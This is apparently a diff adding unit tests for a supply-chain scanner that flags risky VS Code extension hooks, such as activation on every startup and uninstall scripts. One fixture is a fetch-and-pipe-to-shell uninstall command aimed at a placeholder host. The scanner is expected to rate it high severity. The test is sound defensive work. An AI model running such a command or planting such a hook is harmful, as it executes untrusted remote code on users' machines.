@@ -129,3 +129,62 @@ describe('python install hooks', () => {
     expect(await scanInstallHooks(npmDep, Object.keys(files), reader(files))).toEqual([]);
   });
 });
+
+describe('editor extension hooks', () => {
+  const extDep: ResolvedDep = {
+    ...npmDep,
+    ecosystem: 'vscode',
+    name: 'pub.ext',
+    installPath: '/ext',
+  };
+  const ext = (manifest: Record<string, unknown>, file = '/ext/package.json') =>
+    scanInstallHooks(extDep, [file], reader({ [file]: JSON.stringify(manifest, null, 2) }));
+
+  it('flags activation on every startup as low', async () => {
+    const [f] = await ext({ activationEvents: ['onCommand:x', '*'] });
+    expect(f).toMatchObject({
+      ruleId: 'install-hook/vscode-startup-activation',
+      category: 'install-hook',
+      source: 'install-hook',
+      severity: 'low',
+      package: { ecosystem: 'vscode', name: 'pub.ext' },
+      location: { file: '/ext/package.json', range: { startLine: 3 } },
+    });
+    expect(f?.message).toContain('every time the editor starts');
+  });
+
+  it('does not flag narrower activation events', async () => {
+    expect(await ext({ activationEvents: ['onStartupFinished', 'onLanguage:python'] })).toEqual([]);
+    expect(await ext({ activationEvents: '*' })).toEqual([]);
+    expect(await ext({ name: 'x' })).toEqual([]);
+  });
+
+  it('flags uninstall scripts, high when they download or run code', async () => {
+    const [plain] = await ext({ scripts: { 'vscode:uninstall': 'node ./out/uninstall.js' } });
+    expect(plain).toMatchObject({
+      ruleId: 'install-hook/vscode-uninstall-script',
+      severity: 'medium',
+      title: 'Runs a script on uninstall',
+    });
+    const [bad] = await ext({
+      scripts: { 'vscode:uninstall': 'curl -s https://x.example.invalid/u.sh | sh' },
+    });
+    expect(bad).toMatchObject({
+      severity: 'high',
+      title: 'Uninstall script downloads or runs code',
+    });
+    expect(await ext({ scripts: { 'vscode:prepublish': 'curl x | sh' } })).toEqual([]);
+  });
+
+  it('only reads the extension root manifest', async () => {
+    expect(await ext({ activationEvents: ['*'] }, '/ext/node_modules/dep/package.json')).toEqual(
+      [],
+    );
+    const npmManifest = { '/pkg/package.json': '{"activationEvents":["*"]}' };
+    expect(await scanInstallHooks(npmDep, Object.keys(npmManifest), reader(npmManifest))).toEqual(
+      [],
+    );
+    const broken = { '/ext/package.json': '' };
+    expect(await scanInstallHooks(extDep, Object.keys(broken), reader(broken))).toEqual([]);
+  });
+});
